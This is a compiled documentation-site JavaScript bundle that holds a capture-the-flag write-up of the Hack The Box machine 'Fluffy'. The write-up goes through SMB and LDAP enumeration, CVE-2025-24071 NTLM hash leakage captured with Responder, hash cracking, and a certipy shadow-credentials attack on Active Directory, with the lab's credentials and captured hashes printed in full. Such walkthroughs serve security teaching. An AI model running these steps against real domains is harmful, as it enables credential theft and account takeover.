"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[759],{8453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>o});var t=s(6540);const i={},a=t.createContext(i);function r(e){const n=t.useContext(a);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:n},e.children)}},9336:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/Machines/Windows/easy/Fluffy","title":"Fluffy","description":"As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!","source":"@site/docs/Hacking/Write-ups/Hack the box/Machines/Windows/easy/Fluffy.md","sourceDirName":"Hacking/Write-ups/Hack the box/Machines/Windows/easy","slug":"/write-up/htb/machines/easy/fluffy","permalink":"/docs/write-up/htb/machines/easy/fluffy","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/machines/easy/fluffy","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var i=s(4848),a=s(8453);const r={slug:"/write-up/htb/machines/easy/fluffy",pagination_next:null,pagination_prev:null},o="Fluffy",l={},c=[{value:"Enumeration",id:"enumeration",level:2},{value:"LDAP enumeration",id:"ldap-enumeration",level:3},{value:"CVE-2025-24071",id:"cve-2025-24071",level:2},{value:"Bloodhound",id:"bloodhound",level:3}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"fluffy",children:"Fluffy"})}),"\n",(0,i.jsx)(n.p,{children:"As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!"}),"\n",(0,i.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,i.jsx)(n.p,{children:"We are told this is a Windows box"}),"\n",(0,i.jsx)(n.p,{children:"Normal nmap scan reveals a lot of stuff opened:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ nmap 10.10.11.69\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 13:13 CEST\nNmap scan report for 10.10.11.69\nHost is up (0.034s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap done: 1 IP address (1 host up) scanned in 6.77 seconds\n"})}),"\n",(0,i.jsx)(n.p,{children:"Looks like SMB ports are opened, let's check what in there:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ smbclient -L \\\\10.10.11.69 -N     \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        IT              Disk      \n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n"})}),"\n",(0,i.jsx)(n.p,{children:"In the IT share we see some interesting things:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u2514\u2500$ smbclient \\\\\\\\10.10.11.69\\\\IT --user="j.fleischman"\nPassword for [WORKGROUP\\j.fleischman]:\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Wed Jul 30 17:27:03 2025\n  ..                                  D        0  Wed Jul 30 17:27:03 2025\n  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025\n  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025\n  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025\n  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025\n  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025\n\n                5842943 blocks of size 4096. 2236192 blocks available\nsmb: \\> pwd\nCurrent directory is \\\\10.10.11.69\\IT\\\n'})}),"\n",(0,i.jsx)(n.p,{children:"Checking the changes from everything.exe shows something promising:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-txt",children:"Friday, 20 June 2025: Version 1.4.1.1028\n fixed a crash when getting help text from a context menu item that throws an exception.\n updated localization.\n\nFriday, 23 May 2025: Version 1.4.1.1027\n updated localization.\n improved security against dll hijacking.\n\nThursday, 1 August 2024: Version 1.4.1.1026\n updated localization.\n"})}),"\n",(0,i.jsxs)(n.p,{children:["Looks like version ",(0,i.jsx)(n.code,{children:"1.4.1.1026"})," is vulnerable to dll hijacking."]}),"\n",(0,i.jsx)(n.p,{children:"In the SYSVOL, there's also an interesting file:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u2514\u2500$ smbclient \\\\\\\\10.10.11.69\\\\SYSVOL --user="j.fleischman"\nPassword for [WORKGROUP\\j.fleischman]:\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Thu Apr 17 17:59:21 2025\n  ..                                  D        0  Thu Apr 17 17:59:21 2025\n  fluffy.htb                         Dr        0  Thu Apr 17 17:59:21 2025\n\n                5842943 blocks of size 4096. 2236145 blocks available\nsmb: \\>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["This looks like some Active Directory policies or something similar. According to ",(0,i.jsx)(n.a,{href:"https://blog.netwrix.com/2017/01/30/sysvol-directory/",children:"https://blog.netwrix.com/2017/01/30/sysvol-directory"})]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"The system volume (SYSVOL) is a special directory on each DC. It is made up of several folders with one being shared and referred to as the SYSVOL share."}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"We'll now exfiliate the files from the samba share to our computer to analyze them."}),"\n",(0,i.jsx)(n.p,{children:"The PDF warns the sysadm to patch the system to mitigate the impact of the following CVEs:"}),"\n",(0,i.jsx)(n.p,{children:"CVE-2025-24996 - Critical"}),"\n",(0,i.jsxs)(n.p,{children:["Looks like this vulnerability allows a user to trick NTLM into connect as another user. There's no POC available, however, ChatGPT suggest to use ",(0,i.jsx)(n.a,{href:"https://github.com/p0dalirius/Coercer",children:"https://github.com/p0dalirius/Coercer"})," to check if we're lucky."]}),"\n",(0,i.jsx)(n.p,{children:"CVE-2025-24071 - Critical"}),"\n",(0,i.jsxs)(n.p,{children:["Looks like there's a poc for CVE-2025-24071: ",(0,i.jsx)(n.a,{href:"https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-",children:"https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-"}),". The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes."]}),"\n",(0,i.jsx)(n.p,{children:"CVE-2025-46785 - High"}),"\n",(0,i.jsx)(n.p,{children:"Related with a Buffer overflow in Zoom Workplace application. Maybe to be used for privilege escalation?"}),"\n",(0,i.jsx)(n.p,{children:"CVE-2025-29968 - High"}),"\n",(0,i.jsx)(n.p,{children:"Looks like denial of service vulnerability"}),"\n",(0,i.jsx)(n.p,{children:"CVE-2025-21193 - Medium"}),"\n",(0,i.jsx)(n.p,{children:"Spoofing in Active Directory, might be interesting"}),"\n",(0,i.jsx)(n.p,{children:"CVE-2025-3445  - Low"}),"\n",(0,i.jsx)(n.p,{children:"Relates to mholt/archiver golang"}),"\n",(0,i.jsx)(n.p,{children:"Most likely one of these vulnerabilities will be useful to us"}),"\n",(0,i.jsx)(n.p,{children:"The networks shares contain some zip files containing some exe files. Maybe there are useful somehow?"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-txt",children:"- everything-1.4.1.exe: https://www.voidtools.com/faq/\n- kepass-2.58.exe: https://keepass.info/news/n250709_2.59.html\n"})}),"\n",(0,i.jsxs)(n.p,{children:["We can enumerate all the users in the machine with ",(0,i.jsx)(n.code,{children:"crackmapexec"}),":"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'crackmapexec smb fluffy.htb -u anonymous -p "" --rid-brute 10000 > users     \n'})}),"\n",(0,i.jsx)(n.p,{children:"And discard garbage data:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"cat users|grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\\' |grep -Ev (DC|SVC) |tail -n +4 > users.txt\n"})}),"\n",(0,i.jsx)(n.h3,{id:"ldap-enumeration",children:"LDAP enumeration"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"ldapdomaindump fluffy.htb -u 'fluffy.htb\\j.fleischman' -p 'J0elTHEM4n1990!' --no-json --no-grep\n"})}),"\n",(0,i.jsx)(n.p,{children:"This produces the list of computers, groups, users and permissions."}),"\n",(0,i.jsx)(n.h2,{id:"cve-2025-24071",children:"CVE-2025-24071"}),"\n",(0,i.jsx)(n.p,{children:"We managed to fabricate the payload required and upload it via SMB."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"python3 CVE-2025-24071.py -i 10.10.15.19 -n testpayload -o ./output --keep \n"})}),"\n",(0,i.jsx)(n.p,{children:"When listening for events with responder, we get the NTLM Hash of user p.agila"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"[+] Listening for events...                                                                                                                                                                                                                 \n\n[SMB] NTLMv2-SSP Client   : 10.10.11.69\n[SMB] NTLMv2-SSP Username : FLUFFY\\p.agila\n[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:bd8f7fef990474ff:C7C0CB9CAC9525F2D208E32C10E7C248:0101000000000000001DAD238801DC01142342D76B81FA3800000000020008004E0058003800370001001E00570049004E002D0041005A00310051004E0056003200410030004400490004003400570049004E002D0041005A00310051004E005600320041003000440049002E004E005800380037002E004C004F00430041004C00030014004E005800380037002E004C004F00430041004C00050014004E005800380037002E004C004F00430041004C0007000800001DAD238801DC0106000400020000000800300030000000000000000100000000200000281213D3D4900283CBDD465132F4069EAD5996FF744C8BC81B4B59245480EF190A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310039000000000000000000\n"})}),"\n",(0,i.jsx)(n.p,{children:"With hashcat and rockyou, we are able to retrieve the password:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"hashcat --show -m 5600 -a 0 pagilahash /usr/share/wordlists/rockyou.txt\n"})}),"\n",(0,i.jsx)(n.p,{children:"prometheusx-303"}),"\n",(0,i.jsx)(n.h3,{id:"bloodhound",children:"Bloodhound"}),"\n",(0,i.jsx)(n.p,{children:"From the LDAP dump, we know that this user is a Service Account Manager."}),"\n",(0,i.jsx)(n.p,{children:"We can use bloodhound to analyze the Active Directory data:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'bloodhound-python -u "p.agila@fluffy.htb" -p "prometheusx-303" -ns 10.10.11.69 -d fluffy.htb -c all -dc dc01.fluffy.htb --zip\n'})}),"\n",(0,i.jsxs)(n.p,{children:["It is really import to collect all the fields, otherwise some permission declaration will not be present in the graph database. Also, the key was provide the ",(0,i.jsx)(n.code,{children:"-dc"})," flag."]}),"\n",(0,i.jsx)(n.p,{children:"Using the bloodhound UI, we can see an interesting path: p.agila user reaches to the winrm_svc account, which most likely will allow us to connect to the machine with evil-winrm."}),"\n",(0,i.jsx)(n.p,{children:"First, we need to add the user p.agila to SERVICE_ACCOUNTS group:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'net rpc group addmem "SERVICE ACCOUNTS@FLUFFY.HTB" "p.agila" -U "fluffy.htb"/"P.AGILA"%"prometheusx-303" -S 10.10.11.69\n'})}),"\n",(0,i.jsx)(n.p,{children:"The msDS-KeyCredentialLink attribute is a multi-valued attribute on AD user or computer objects used to store public key material (or references to it) for passwordless authentication methods like Windows Hello for Business (WHfB) and FIDO2 security keys. When a user attempts to authenticate using such a credential, the system presents a cryptographic proof tied to the private key, and AD validates it against the public key material linked via this attribute."}),"\n",(0,i.jsx)(n.p,{children:"Attackers with write access to an account's msDS-KeyCredentialLink attribute can add their own public key material, creating what's known as \"shadow credentials.\" This allows the attacker to subsequently authenticate as that user without needing their password, by using the corresponding private key they control. Certipy's shadow auto command can be used to exploit this if the necessary permissions are available. While distinct from AD CS certificate abuse, it's another form of key-based authentication bypass/persistence."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303'  -account 'WINRM_SVC'  -dc-ip '10.10.11.69'\n[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n"})}),"\n",(0,i.jsx)(n.p,{children:"This is because the clock is not synchronized between the attacking machine and the target. We need to sync the clock with the target machine:"}),"\n",(0,i.jsx)(n.p,{children:"Execute the following as root:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"timedatectl set-ntp off\nrdate -n [IP of Target]\n"})}),"\n",(0,i.jsx)(n.p,{children:"This will stop NTP and sync the date and time with the IP provided."}),"\n",(0,i.jsxs)(n.p,{children:["After doing this, the shadow credential attack is successful and we retrieve the NT hash for ",(0,i.jsx)(n.code,{children:"winrm_svc"})]})]})}function d(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}}}]);